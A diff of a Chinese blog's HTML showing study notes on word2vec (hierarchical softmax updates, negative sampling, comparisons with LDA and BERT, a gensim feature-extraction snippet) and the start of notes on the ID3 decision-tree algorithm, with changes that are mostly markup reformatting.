-<p><img src="https://www.zhihu.com/equation?tex=%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Cmathbf%7Bx%7D_%7Bw%7D-d_%7Bj%7D%5E%7Bw%7D+%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29+%5Cmathbf%7Bx%7D_%7Bw%7D" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Cmathbf%7Bx%7D_%7Bw%7D-d_%7Bj%7D%5E%7Bw%7D+%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29+%5Cmathbf%7Bx%7D_%7Bw%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p><strong>合并同类项得到：</strong></p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cleft%5B1-d_%7Bj%7D%5E%7Bw%7D-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Cmathbf%7Bx%7D_%7Bw%7D" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cleft%5B1-d_%7Bj%7D%5E%7Bw%7D-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Cmathbf%7Bx%7D_%7Bw%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>于是 <img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]">的更新表达式就得到了：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D+%3A%3D%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%2B%5Ceta%5Cleft%5B1-d_%7Bj%7D%5E%7Bw%7D-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Cmathbf%7Bx%7D_%7Bw%7D" alt="[公式]"></p>
-<p>其中， <img src="https://www.zhihu.com/equation?tex=%5Ceta" alt="[公式]"> 是学习率，通常取0-1之间的一个值。学习率越大训练速度越快，但目标函数容易在局部区域来回抖动。</p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D+%3A%3D%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%2B%5Ceta%5Cleft%5B1-d_%7Bj%7D%5E%7Bw%7D-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Cmathbf%7Bx%7D_%7Bw%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
+<p>其中， <img src="https://www.zhihu.com/equation?tex=%5Ceta" alt="[公式]">
+是学习率，通常取0-1之间的一个值。学习率越大训练速度越快，但目标函数容易在局部区域来回抖动。</p>
 <p><strong>再来 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> 的偏导数</strong>，注意到 <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28w%2C+j%29%3D%5Cleft%281-d_%7Bj%7D%5E%7Bw%7D%5Cright%29+%5Ccdot+%5Clog+%5Cleft%5B%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D%2Bd_%7Bj%7D%5E%7Bw%7D+%5Ccdot+%5Clog+%5Cleft%5B1-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D" alt="[公式]"> 中 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> 和 <img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]"> 是对称的，所有直接将 <img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]"> 的偏导数中的 <img src="https://www.zhihu.com/equation?tex=%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]"> 替换为 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> ，得到关于 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> 的偏导数：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+%5Cmathcal%7BL%7D%28w%2C+j%29%7D%7B%5Cpartial+%5Cmathbf%7Bx%7D_%7Bw%7D%7D%3D%5Cleft%5B1-d_%7Bj%7D%5E%7Bw%7D-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]"></p>
-<p><strong>不过 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> 是上下文的词向量的和，不是上下文单个词的词向量。怎么把这个更新量应用到单个词的词向量上去呢？word2vec采取的是直接将 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> 的更新量整个应用到每个单词的词向量上去</strong>：</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7Bv%7D%28%5Cwidetilde%7Bw%7D%29+%3A%3D%5Cmathbf%7Bv%7D%28%5Cwidetilde%7Bw%7D%29%2B%5Ceta+%5Csum_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D+%5Cfrac%7B%5Cpartial+%5Cmathcal%7BL%7D%28w%2C+j%29%7D%7B%5Cpartial+%5Cmathbf%7Bx%7D_%7Bw%7D%7D%2C+%5Cquad+%5Cwidetilde%7Bw%7D+%5Cin+%5Ctext+%7B+Context+%7D%28w%29" alt="[公式]"></p>
-<p>其中， <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7Bv%7D%28%5Cwidetilde%7Bw%7D%29" alt="[公式]"> 代表上下文中某一个单词的词向量。我认为应该也可以将其平均后更新到每个词向量上去，无非是学习率的不同，欢迎指正。</p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cfrac%7B%5Cpartial+%5Cmathcal%7BL%7D%28w%2C+j%29%7D%7B%5Cpartial+%5Cmathbf%7Bx%7D_%7Bw%7D%7D%3D%5Cleft%5B1-d_%7Bj%7D%5E%7Bw%7D-%5Csigma%5Cleft%28%5Cmathbf%7Bx%7D_%7Bw%7D%5E%7B%5Ctop%7D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D%5Cright%29%5Cright%5D+%5Ctheta_%7Bj-1%7D%5E%7Bw%7D" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
+<p><strong>不过 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]">
+是上下文的词向量的和，不是上下文单个词的词向量。怎么把这个更新量应用到单个词的词向量上去呢？word2vec采取的是直接将
+<img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BX%7D_%7Bw%7D" alt="[公式]"> 的更新量整个应用到每个单词的词向量上去</strong>：</p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7Bv%7D%28%5Cwidetilde%7Bw%7D%29+%3A%3D%5Cmathbf%7Bv%7D%28%5Cwidetilde%7Bw%7D%29%2B%5Ceta+%5Csum_%7Bj%3D2%7D%5E%7Bl%5E%7Bw%7D%7D+%5Cfrac%7B%5Cpartial+%5Cmathcal%7BL%7D%28w%2C+j%29%7D%7B%5Cpartial+%5Cmathbf%7Bx%7D_%7Bw%7D%7D%2C+%5Cquad+%5Cwidetilde%7Bw%7D+%5Cin+%5Ctext+%7B+Context+%7D%28w%29" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
+<p>其中， <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7Bv%7D%28%5Cwidetilde%7Bw%7D%29" alt="[公式]">
+代表上下文中某一个单词的词向量。我认为应该也可以将其平均后更新到每个词向量上去，无非是学习率的不同，欢迎指正。</p>
 <h3><span id="22-negative-sampling">2.2 Negative Sampling</span></h3>
 <blockquote>
-<p>Negative Sampling - 素轻的文章 - 知乎 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/56106590">https://zhuanlan.zhihu.com/p/56106590</a></p>
+<p>Negative Sampling - 素轻的文章 - 知乎
+https://zhuanlan.zhihu.com/p/56106590</p>
 </blockquote>
 <blockquote>
 <p><strong>为了解决数量太过庞大的输出向量的更新问题，我们就不更新全部向量，而只更新他们的一个样本</strong>。</p>
-<p>训练神经网络 意味着输入一个训练样本调整weight，让它预测这个训练样本更准。换句话说，每个训练样本将会影响网络中所有的weight。<strong>Negative sampling 解决了这个问题，每次我们就修改了其中一小部分weight，而不是全部。</strong></p>
+<p>训练神经网络
+意味着输入一个训练样本调整weight，让它预测这个训练样本更准。换句话说，每个训练样本将会影响网络中所有的weight。<strong>Negative
+sampling
+解决了这个问题，每次我们就修改了其中一小部分weight，而不是全部。</strong></p>
 </blockquote>
 <p><strong>负采样是另一种用来提高Word2Vec效率的方法</strong>，它是基于这样的观察：训练一个神经网络意味着使用一个训练样本就要稍微调整一下神经网络中所有的权重，这样才能够确保预测训练样本更加精确，如果能设计一种方法每次只更新一部分权重，那么计算复杂度将大大降低。</p>
-<p>如果 vocabulary 大小为10000时， 当输入样本 ( “fox”, “quick”) 到神经网络时， <strong>“ fox” 经过 one-hot 编码，在输出层我们期望对应 “quick” 单词的那个神经元结点输出 1，其余 9999 个都应该输出 0</strong>。在这里，这9999个我们期望输出为0的神经元结点所对应的单词我们为 negative word.   negative sampling 的想法也很直接 ，<strong>将随机选择一小部分的 negative words，比如选 10个 negative words 来更新对应的权重参数。</strong></p>
-<p><strong>假设原来模型每次运行都需要300×10,000(其实没有减少数量，但是运行过程中，减少了需要载入的数量。) 现在只要300×(1+10)减少了好多。</strong></p>
-<h4><span id="问题来了如何选择10个negative-sample呢">==问题来了，如何选择10个negative sample呢？==</span></h4>
-<p><strong>negative sample也是根据他们出现概率来选的，而这个概率又和他们出现的频率有关。更常出现的词，更容易被选为negative sample。</strong></p>
+<p>如果 vocabulary 大小为10000时， 当输入样本 ( "fox", "quick")
+到神经网络时， <strong>“ fox” 经过 one-hot 编码，在输出层我们期望对应
+“quick” 单词的那个神经元结点输出 1，其余 9999 个都应该输出
+0</strong>。在这里，这9999个我们期望输出为0的神经元结点所对应的单词我们为
+negative word. negative sampling 的想法也很直接
+，<strong>将随机选择一小部分的 negative words，比如选 10个 negative
+words 来更新对应的权重参数。</strong></p>
+<p><strong>假设原来模型每次运行都需要300×10,000(其实没有减少数量，但是运行过程中，减少了需要载入的数量。)
+现在只要300×(1+10)减少了好多。</strong></p>
+<h4><span id="问题来了如何选择10个negativesample呢">==问题来了，如何选择10个negative
+sample呢？==</span></h4>
+<p><strong>negative
+sample也是根据他们出现概率来选的，而这个概率又和他们出现的频率有关。更常出现的词，更容易被选为negative
+sample。</strong></p>
 <p>这个概率用一个公式表示，每个词给了一个和它频率相关的权重。这个概率公式为：</p>
-<p><img src="https://www.zhihu.com/equation?tex=P%28w_i%29+%3D+%5Cfrac%7Bf%28w_i%29%5E%7B0.75%7D+%7D%7B+%5Csum_%7Bj%3D0%7D%5E%7Bn%7D%28f%28w_j%29%5E%7B0.75%7D%7D%29" alt="[公式]"></p>
+<figure>
+<img src="https://www.zhihu.com/equation?tex=P%28w_i%29+%3D+%5Cfrac%7Bf%28w_i%29%5E%7B0.75%7D+%7D%7B+%5Csum_%7Bj%3D0%7D%5E%7Bn%7D%28f%28w_j%29%5E%7B0.75%7D%7D%29" alt="[公式]">
+<figcaption aria-hidden="true">[公式]</figcaption>
+</figure>
 <p>在paper中说0.75这个超参是试出来的，这个函数performance比其他函数好。</p>
-<p>**<font color="red"> 负采样算法实际上就是一个带权采样过程，负例的选择机制是和单词词频联系起来的。</font>**具体做法是以 <code>N+1</code> 个点对区间 <code>[0,1]</code> 做非等距切分，并引入的一个在区间 <code>[0,1]</code> 上的 <code>M</code> 等距切分，其中 <code>M &gt;&gt; N。</code>源码中取 M = 10^8。然后对两个切分做投影，得到映射关系：采样时，每次生成一个 [1, M-1] 之间的整数 i，则 Table(i) 就对应一个样本；当采样到正例时，跳过（<strong>拒绝采样</strong>）。</p>
-<p><img src="https://pic4.zhimg.com/80/v2-36547a4cd05365292830ad4b22ba4c93_1440w.png" alt="img"></p>
-<p><img src="https://pic3.zhimg.com/80/v2-a788595cc2611b0bfdac9e039a2e82fe_1440w.png" alt="img"></p>
-<p><img src="https://pic1.zhimg.com/80/v2-cfe67c913af37a9435f3331139abeab8_1440w.jpg" alt="img"></p>
+<p><strong><font color="red">
+负采样算法实际上就是一个带权采样过程，负例的选择机制是和单词词频联系起来的。</font></strong>具体做法是以
+<code>N+1</code> 个点对区间 <code>[0,1]</code>
+做非等距切分，并引入的一个在区间 <code>[0,1]</code> 上的 <code>M</code>
+等距切分，其中 <code>M &gt;&gt; N。</code>源码中取 M =
+10^8。然后对两个切分做投影，得到映射关系：采样时，每次生成一个 [1, M-1]
+之间的整数 i，则 Table(i)
+就对应一个样本；当采样到正例时，跳过（<strong>拒绝采样</strong>）。</p>
+<figure>
+<img src="https://pic4.zhimg.com/80/v2-36547a4cd05365292830ad4b22ba4c93_1440w.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img src="https://pic3.zhimg.com/80/v2-a788595cc2611b0bfdac9e039a2e82fe_1440w.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img src="https://pic1.zhimg.com/80/v2-cfe67c913af37a9435f3331139abeab8_1440w.jpg" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <h2><span id="三-word2vec-qampa">三、Word2vec Q&amp;A</span></h2>
 <h3><span id="31-word2vec与lda的区别">3.1 Word2Vec与LDA的区别</span></h3>
-<ol>
-<li>
-<p>LDA是利用文档中<strong>单词的共现关系</strong>来对单词按<strong>主题聚类</strong>，也可以理解为对“<strong>文档-单词</strong>”矩阵进行<strong>分解</strong>，得到“<strong>文档-主题</strong>”和“<strong>主题-单词</strong>”两个<strong>概率分布</strong>。</p>
-</li>
-<li>
-<p>Word2Vec是利用<strong>上下文-单词</strong>“矩阵进行学习，其中上下文由周围的几个单词组成，由此得到的词向量表示更多地融入了上下文共现的特征。也就是说，如果两个单词所对应的word2vec向量相似度较高，那么它们很可能经常在同样的上下文中出现。</p>
-</li>
-<li>
-<p>LDA模型是一种基于<strong>概率图模型</strong>的<strong>生成式模型</strong>，其似然函数可以写成若干条件概率连乘的形式，其中包括需要推测的隐含变量（即主题）；</p>
-</li>
-<li>
-<p>而Word2Vec模型一般表达为<strong>神经网络</strong>的形式，似然函数定义在网络的输出之上，需要通过学习网络的权重以得到单词的稠密向量表示。</p>
-</li>
+<ol type="1">
+<li><p>LDA是利用文档中<strong>单词的共现关系</strong>来对单词按<strong>主题聚类</strong>，也可以理解为对“<strong>文档-单词</strong>”矩阵进行<strong>分解</strong>，得到“<strong>文档-主题</strong>”和“<strong>主题-单词</strong>”两个<strong>概率分布</strong>。</p></li>
+<li><p>Word2Vec是利用<strong>上下文-单词</strong>“矩阵进行学习，其中上下文由周围的几个单词组成，由此得到的词向量表示更多地融入了上下文共现的特征。也就是说，如果两个单词所对应的word2vec向量相似度较高，那么它们很可能经常在同样的上下文中出现。</p></li>
+<li><p>LDA模型是一种基于<strong>概率图模型</strong>的<strong>生成式模型</strong>，其似然函数可以写成若干条件概率连乘的形式，其中包括需要推测的隐含变量（即主题）；</p></li>
+<li><p>而Word2Vec模型一般表达为<strong>神经网络</strong>的形式，似然函数定义在网络的输出之上，需要通过学习网络的权重以得到单词的稠密向量表示。</p></li>
 </ol>
 <h3><span id="32-word2vec存在的问题是什么">3.2 Word2Vec存在的问题是什么？</span></h3>
 <ul>
-<li>对每个local context window单独训练，没有利用包 含在global co-currence矩阵中的统计信息。</li>
+<li>对每个local context window单独训练，没有利用包 含在global
+co-currence矩阵中的统计信息。</li>
 <li>对多义词无法很好的表示和处理，因为使用了唯一的词向量</li>
 </ul>
-<h3><span id="32-ood-of-word2vec">3.2  OOD of word2vec</span></h3>
+<h3><span id="32-ood-of-word2vec">3.2 OOD of word2vec</span></h3>
 <p>其它单词认定其为Unknow，编号为0</p>
 <h3><span id="34-项目中的word2vec">3.4 项目中的word2vec</span></h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">feature_asm2vec</span>(<span class="params">data_type, inter_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Feature engineering for asm2vec feature.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data_type == <span class="string">&quot;train&quot;</span>:</span><br><span class="line">        <span class="comment"># TODO : 模型空判断</span></span><br><span class="line">        <span class="comment"># Train a Word2vec model by mixing traing set and test set</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;------------------------ 训练asm2vec模型 ------------------------&quot;</span>)</span><br><span class="line">        sentences = PathLineSentences(<span class="string">f&quot;<span class="subst">&#123;inter_path&#125;</span>/semantic/&quot;</span>)</span><br><span class="line">        model = Word2Vec(sentences=sentences, vector_size=<span class="number">1024</span>, window=<span class="number">5</span>, min_count=<span class="number">5</span>, workers=<span class="number">5</span>)</span><br><span class="line">        model.wv.save_word2vec_format(<span class="string">f&quot;<span class="subst">&#123;inter_path&#125;</span>/models/asm2vec.bin&quot;</span>, binary=<span class="literal">True</span>, sort_attr=<span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load the trained Word2vec model</span></span><br><span class="line">    model_wv = KeyedVectors.load_word2vec_format(<span class="string">f&quot;<span class="subst">&#123;inter_path&#125;</span>/models/asm2vec.bin&quot;</span>, binary=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------ 生成asm2vec特征 ------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;inter_path&#125;</span>/<span class="subst">&#123;data_type&#125;</span>_filename.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        filename = fp.read().split()</span><br><span class="line">    <span class="comment"># Feature engineering for generating string vector features</span></span><br><span class="line">    obj = StringVector()</span><br><span class="line">    arr = np.zeros((<span class="built_in">len</span>(filename), obj.dim))</span><br><span class="line">    <span class="keyword">with</span> tqdm(total=<span class="built_in">len</span>(filename), ncols=<span class="number">80</span>, desc=obj.name) <span class="keyword">as</span> pbar:</span><br><span class="line">        <span class="keyword">for</span> i, file <span class="keyword">in</span> <span class="built_in">enumerate</span>(filename):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;inter_path&#125;</span>/semantic/<span class="subst">&#123;file&#125;</span>.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                stringz = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            lines = <span class="string">&#x27; &#x27;</span>.join(stringz.split(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">            raw_words = <span class="built_in">list</span>(<span class="built_in">set</span>(lines.split()))</span><br><span class="line">            arr[i, :] = obj.feature_vector((model_wv, raw_words))</span><br><span class="line">            pbar.update(<span class="number">1</span>)</span><br><span class="line">    arr[np.isnan(arr)] = <span class="number">0</span></span><br><span class="line">    np.save(<span class="string">f&quot;<span class="subst">&#123;inter_path&#125;</span>/feature/<span class="subst">&#123;data_type&#125;</span>_semantic.npy&quot;</span>, arr)</span><br></pre></td></tr></table></figure>
 <h3><span id="35-tf-idf-word2vec和bert-比较">3.5 Tf-Idf、Word2Vec和BERT 比较</span></h3>
 <blockquote>
-<p>从算法本质来说 word2vec 一旦训练好了是**没法处理未登录词（OOV）**的，一般的做法是给OOV一个默认的向量，下面是一个类的封装（仅列出核心部分）</p>
+<p>从算法本质来说 word2vec
+一旦训练好了是<strong>没法处理未登录词（OOV）</strong>的，一般的做法是给OOV一个默认的向量，下面是一个类的封装（仅列出核心部分）</p>
 </blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.leiphone.com/category/yanxishe/TbZAzc3CJAMs815p.html">https://www.leiphone.com/category/yanxishe/TbZAzc3CJAMs815p.html</a></p>
+<p>https://www.leiphone.com/category/yanxishe/TbZAzc3CJAMs815p.html</p>
 <ul>
 <li><strong>词袋法</strong>：用scikit-learn进行特征工程、特征选择以及机器学习，测试和评估，用lime解释。</li>
 <li><strong>词嵌入法</strong>：用gensim拟合Word2Vec，用tensorflow/keras进行特征工程和深度学习，测试和评估，用Attention机制解释。</li>
@@ -732,19 +880,19 @@ $$</p>
 </ul>
 <h4><span id="概要">概要</span></h4>
 <p>在本文中，我将使用NLP和Python来解释3种不同的文本多分类策略：老式的词袋法（tf-ldf），著名的词嵌入法（Word2Vec）和最先进的语言模型（BERT）。</p>
-<p><img src="https://static.leiphone.com/uploads/new/images/20200930/5f73ddf75200f.png?imageView2/2/w/740" alt="NLP之文本分类：「Tf-Idf、Word2Vec和BERT」三种模型比较"></p>
+<figure>
+<img src="https://static.leiphone.com/uploads/new/images/20200930/5f73ddf75200f.png?imageView2/2/w/740" alt="NLP之文本分类：「Tf-Idf、Word2Vec和BERT」三种模型比较">
+<figcaption aria-hidden="true">NLP之文本分类：「Tf-Idf、Word2Vec和BERT」三种模型比较</figcaption>
+</figure>
 <p>NLP（自然语言处理）是人工智能的一个领域，它研究计算机和人类语言之间的交互作用，特别是如何通过计算机编程来处理和分析大量的自然语言数据。NLP常用于文本数据的分类。文本分类是指根据文本数据内容对其进行分类的问题。</p>
 <p>我们有多种技术从原始文本数据中提取信息，并用它来训练分类模型。本教程比较了传统的<strong>词袋法</strong>（与简单的机器学习算法一起使用）、流行的<strong>词嵌入模型</strong>（与深度学习神经网络一起使用）和最先进的语言模型（和基于<strong>attention</strong>的<strong>transformers</strong>模型中的<strong>迁移学习</strong>一起使用），语言模型彻底改变了NLP的格局。</p>
 <p>我将介绍一些有用的Python代码，这些代码可以轻松地应用在其他类似的案例中（仅需复制、粘贴、运行），并对代码逐行添加注释，以便你能复现这个例子（下面是全部代码的链接）。</p>
 <p><strong>词袋法</strong>：文件越多，词汇表越大，因此特征矩阵将是一个巨大的稀疏矩阵。</p>
 <h4><span id="bert比之word2vec有哪些进步呢">Bert比之Word2Vec,有哪些进步呢？</span></h4>
 <ul>
-<li>
-<p><strong>静态到动态：一词多义问题</strong></p>
-</li>
-<li>
-<p><strong>词的多层特性</strong>：一个好的语言表示出了建模一词多义现象以外，还需要能够体现词的复杂特性，包括语法 (syntax)、语义 (semantics) 等。</p>
-</li>
+<li><p><strong>静态到动态：一词多义问题</strong></p></li>
+<li><p><strong>词的多层特性</strong>：一个好的语言表示出了建模一词多义现象以外，还需要能够体现词的复杂特性，包括语法
+(syntax)、语义 (semantics) 等。</p></li>
 </ul>
 
       
@@ -835,7 +983,7 @@ $$</p>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1k</span>
+      <span>1.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -855,35 +1003,47 @@ $$</p>
     <div class="post-body" itemprop="articleBody">
           <span id="more"></span>
 <h2><span id="一-id3删特征">一、ID3【删特征】</span></h2>
-<p>ID3 算法是建立在奥卡姆剃刀[<strong>“切勿浪费较多东西去做，用较少的东西，同样可以做好的事情”</strong>]（用较少的东西，同样可以做好事情）的基础上：越是小型的决策树越优于大的决策树。</p>
+<p>ID3
+算法是建立在奥卡姆剃刀[<strong>“切勿浪费较多东西去做，用较少的东西，同样可以做好的事情”</strong>]（用较少的东西，同样可以做好事情）的基础上：越是小型的决策树越优于大的决策树。</p>
 <!--more-->
 <h3><span id="11-思想">1.1 思想</span></h3>
-<p>从信息论的知识中我们知道：信息熵越大，从而样本纯度越低，。ID3 算法的核心思想就是以<strong>信息增益</strong>来度量特征选择，选择信息增益最大的特征进行分裂。算法采用自顶向下的贪婪搜索遍历可能的决策树空间（C4.5 也是贪婪搜索）。 其大致步骤为：</p>
-<ol>
+<p>从信息论的知识中我们知道：信息熵越大，从而样本纯度越低，。ID3
+算法的核心思想就是以<strong>信息增益</strong>来度量特征选择，选择信息增益最大的特征进行分裂。算法采用自顶向下的贪婪搜索遍历可能的决策树空间（C4.5
+也是贪婪搜索）。 其大致步骤为：</p>
+<ol type="1">
 <li>初始化特征集合和数据集合；</li>
 <li>计算数据集合信息熵和所有特征的条件熵，选择信息增益最大的特征作为当前决策节点；</li>
 <li>更新数据集合和特征集合（删除上一步使用的特征，并按照特征值来划分不同分支的数据集合）；</li>
 <li>重复 2，3 两步，若子集值包含单一特征，则为分支叶子节点。</li>
 </ol>
 <h3><span id="12-划分标准">1.2 划分标准</span></h3>
-<p>ID3 使用的分类标准是信息增益，它表示得知特征 A 的信息而使得样本集合不确定性减少的程度。</p>
+<p>ID3 使用的分类标准是信息增益，它表示得知特征 A
+的信息而使得样本集合不确定性减少的程度。</p>
 <p>数据集的<strong>信息熵</strong>：</p>
-<p>$$<br>
-H(D)=-\sum_{k=1}^{K} \frac{\left|C_{k}\right|}{|D|} \log <em>{2} \frac{\left|C</em>{k}\right|}{|D|}<br>
-$$</p>
-<p>其中$C_{k}$表示集合 D 中属于第 k 类样本的样本子集。针对某个特征 A，对于数据集 D 的条件熵 $H(D \mid A)$为：</p>
-<p>$$<br>
-\begin{aligned} H(D \mid A) &amp;=\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|} H\left(D_{i}\right) \ &amp;=-\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}\left(\sum_{k=1}^{K} \frac{\left|D_{i k}\right|}{\left|D_{i}\right|} \log <em>{2} \frac{\left|D</em>{i k}\right|}{\left|D_{i}\right|}\right) \end{aligned}<br>
-$$</p>
-<p><strong>信息增益</strong> = 信息熵 - 条件熵。信息增益越大表示使用特征 A 来划分所获得的“纯度提升越大”。<br>
-$$<br>
-\operatorname{Gain}(D, A)=H(D)-H(D \mid A)<br>
-$$</p>
+<p><span class="math display">\[
+H(D)=-\sum_{k=1}^{K} \frac{\left|C_{k}\right|}{|D|} \log _{2}
+\frac{\left|C_{k}\right|}{|D|}
+\]</span></p>
+<p>其中<span class="math inline">\(C_{k}\)</span>表示集合 D 中属于第 k
+类样本的样本子集。针对某个特征 A，对于数据集 D 的条件熵 <span class="math inline">\(H(D \mid A)\)</span>为：</p>
+<p><span class="math display">\[
+\begin{aligned} H(D \mid A) &amp;=\sum_{i=1}^{n}
+\frac{\left|D_{i}\right|}{|D|} H\left(D_{i}\right) \\
+&amp;=-\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}\left(\sum_{k=1}^{K}
+\frac{\left|D_{i k}\right|}{\left|D_{i}\right|} \log _{2}
+\frac{\left|D_{i k}\right|}{\left|D_{i}\right|}\right) \end{aligned}
+\]</span></p>
+<p><strong>信息增益</strong> = 信息熵 - 条件熵。信息增益越大表示使用特征
+A 来划分所获得的“纯度提升越大”。 <span class="math display">\[
+\operatorname{Gain}(D, A)=H(D)-H(D \mid A)
+\]</span></p>
